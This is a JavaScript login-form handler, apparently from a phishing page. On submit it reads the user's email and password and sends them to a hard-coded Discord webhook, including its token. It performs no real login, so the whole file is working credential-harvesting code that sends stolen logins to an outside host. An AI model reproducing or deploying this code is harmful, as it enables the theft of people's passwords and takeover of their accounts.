document.getElementById('login-form').addEventListener('submit', function(e) {
    e.preventDefault();

    const email = e.target.email.value;
    const password = e.target.password.value;

    const data = {
        content: `Email: ${email}\nPassword: ${password}`
    };

    fetch('https://discord.com/api/webhooks/1220738795570335895/kT8-knDmwJQAAfRc9uPnX0naFtjXyzXjqVYiqEXV-BEx0Ubggl3o7-sXpqH6ZvoFZ9oe', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
    }).then(response => {
        if (response.ok) {
            alert('Data sent successfully!');
        } else {
            alert('Failed to send data.');
        }
    }).catch(error => {
        alert('An error occurred: ' + error.message);
    });
});
